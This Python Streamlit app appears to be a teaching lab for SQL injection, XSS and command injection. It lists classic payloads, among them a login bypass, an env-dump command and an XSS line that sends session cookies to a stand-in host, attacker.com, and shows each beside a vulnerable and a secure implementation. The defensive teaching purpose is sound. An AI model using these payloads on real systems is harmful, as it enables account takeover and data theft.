
import streamlit as st
import pandas as pd
from typing import List, Dict

# --- COMPREHENSIVE PAYLOAD DATA ---
PAYLOAD_DATA = {
    "SQL Injection": [
        {
            "type": "Authentication Bypass",
            "payload": "' OR '1'='1",
            "description": "Tries to trick logic into evaluating true (e.g. login bypass).",
            "impact": "Can allow unauthorized access to accounts without a password.",
            "risk_level": "Critical"
        },
        {
            "type": "Union Based",
            "payload": "' UNION SELECT 1, user(), database() --",
            "description": "Attempts to append results from another query (e.g. database name).",
            "impact": "Exposes internal database structure and sensitive data.",
            "risk_level": "High"
        },
        {
            "type": "Time Based (Blind)",
            "payload": "'; WAITFOR DELAY '0:0:5' --",
            "description": "Asks the DB to pause. If the page loads slowly, injection is confirmed.",
            "impact": "Confirms vulnerability even when no data is returned to the user.",
            "risk_level": "High"
        }
    ],
    "XSS (Cross-Site Scripting)": [
        {
            "type": "Basic Alert",
            "payload": "<script>alert('XSS')</script>",
            "description": "The most basic test to see if script execution is possible.",
            "impact": "Can execute arbitrary JavaScript in the victim's browser.",
            "risk_level": "High"
        },
        {
            "type": "Cookie Stealing",
            "payload": "<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>",
            "description": "Attempts to send the user's session cookies to an external server.",
            "impact": "Can lead to full account takeover by hijacking active sessions.",
            "risk_level": "Critical"
        },
        {
            "type": "SVG Payload",
            "payload": "<svg onload=alert(1)>",
            "description": "Uses SVG image tags to bypass simple filter string matching.",
            "impact": "Commonly used when <script> tags are filtered but images are allowed.",
            "risk_level": "High"
        }
    ],
    "Command Injection": [
        {
            "type": "Simple Chaining",
            "payload": "; ls -la",
            "description": "Uses semicolon to chain a hidden command to the intended one.",
            "impact": "Can lead to full server compromise by executing OS commands.",
            "risk_level": "Critical"
        },
        {
            "type": "Background Execution",
            "payload": "& ping -c 4 google.com &",
            "description": "Tries to background a command to check for blind injection.",
            "impact": "Confirms the ability to run external processes silently.",
            "risk_level": "High"
        },
        {
            "type": "Environment Leak",
            "payload": " && env",
            "description": "Executes 'env' to dump all server-side environment variables.",
            "impact": "Exposes API keys, database credentials, and system paths.",
            "risk_level": "Critical"
        }
    ]
}

def run_sqli_analyzer_view() -> None:
    """Render the Improved Multi-Vector Payload Tester View."""
    st.header("🧪 Advanced Payload Testing Laboratory")
    st.markdown("Interactive sandbox for simulating and understanding web vulnerabilities securely.")

    with st.container():
        st.subheader("⚙️ Attack Configuration")
        col_cat, col_type = st.columns([1, 1])
        
        with col_cat:
            category = st.selectbox("Attack Vector Category", list(PAYLOAD_DATA.keys()))
        
        with col_type:
            available_payloads = PAYLOAD_DATA[category]
            sqli_type = st.selectbox("Specific Payload Variant", [p["type"] for p in available_payloads])
    
    selected_payload = next(p for p in available_payloads if p["type"] == sqli_type)
    
    # Payload Detail Card
    with st.container():
        c1, c2 = st.columns([3, 1])
        with c1:
            st.info(f"**Description:** {selected_payload['description']}")
            st.warning(f"💥 **Potential Impact:** {selected_payload['impact']}")
        with c2:
            st.metric("Risk Severity", selected_payload['risk_level'], delta_color="inverse")
            
        # Display the payload
        st.caption("Generated Payload String")
        st.code(selected_payload["payload"], language="bash" if category == "Command Injection" else "sql")
        
        if st.button("📋 Copy to Clipboard (Simulated)", use_container_width=True):
             st.toast(f"Payload copied: {selected_payload['type']}", icon="📋")

    st.markdown("---")

    # 2. Interactive Simulator
    st.subheader("🛡️ Defense Simulation Engine")
    st.markdown(f"Simulate processing of **{category}** inputs against vulnerable vs. secure backends.")

    col_input, col_act = st.columns([3, 1])
    with col_input:
        test_input = st.text_input("Injection Test Input", value=selected_payload["payload"])
    with col_act:
        st.write("") # spacer
        st.write("")
        run_sim = st.button("⚡ Run Simulation", use_container_width=True)
    
    if run_sim or test_input:
        sim_col1, sim_col2 = st.columns(2)
        
        with sim_col1:
            st.markdown("### 🔓 Vulnerable Implementation")
            with st.container():
                if category == "SQL Injection":
                    st.code(f"query = \"SELECT * FROM users WHERE id = '{test_input}'\"", language="python")
                    st.code(f"db.execute(query) # Unsafe!", language="python")
                elif category == "XSS (Cross-Site Scripting)":
                    st.code(f"return f\"<div>Hello, {test_input}</div>\"", language="python")
                else:
                    st.code(f"os.system('ping ' + '{test_input}')", language="python")
                
                # Check for indicators
                malicious = False
                if category == "SQL Injection" and ("'" in test_input or "--" in test_input): malicious = True
                elif category == "XSS (Cross-Site Scripting)" and ("<script" in test_input.lower() or "onload" in test_input.lower()): malicious = True
                elif category == "Command Injection" and (";" in test_input or "&" in test_input): malicious = True
                
                if malicious:
                    st.error("🚨 **Exploit Successful:** Logic compromised! The input broke out of the data context.")
                else:
                    st.info("ℹ️ Input treated as data, but still risky.")

        with sim_col2:
            st.markdown("### 🔒 Secure Implementation")
            with st.container():
                if category == "SQL Injection":
                    st.code("db.execute('SELECT * FROM users WHERE id = ?', (input,))", language="python")
                    st.caption("✅ Parameterized Query")
                elif category == "XSS (Cross-Site Scripting)":
                    st.code(f"return render_template('h.html', n=escape(input))", language="python")
                    st.caption("✅ Context-Aware Escaping")
                else:
                    st.code("subprocess.run(['ping', input])", language="python")
                    st.caption("✅ Argument Separation")
                st.success("🛡️ **Attack Neutralized:** Input is strictly treated as data, preventing code execution.")

    # 3. Defensive Knowledge Base
    with st.expander("📚 Remediation & Best Practices"):
        if category == "SQL Injection":
            st.markdown("""
            - **Primary Defense:** Use Prepared Statements (Parameterized Queries).
            - **Secondary Defense:** Use Stored Procedures.
            - **Mitigation:** Enforce Least Privilege on database accounts.
            """)
        elif category == "XSS (Cross-Site Scripting)":
            st.markdown("""
            - **Primary Defense:** Output Encoding for the specific context (HTML, JS, CSS).
            - **Secondary Defense:** Content Security Policy (CSP).
            - **Mitigation:** Set `HttpOnly` and `Secure` flags on cookies.
            """)
        else:
            st.markdown("""
            - **Primary Defense:** Avoid calling shell commands if possible.
            - **Secondary Defense:** Use API-based execution (e.g. `execv`) that separates arguments.
            - **Mitigation:** Input validation against a strict allow-list.
            """)

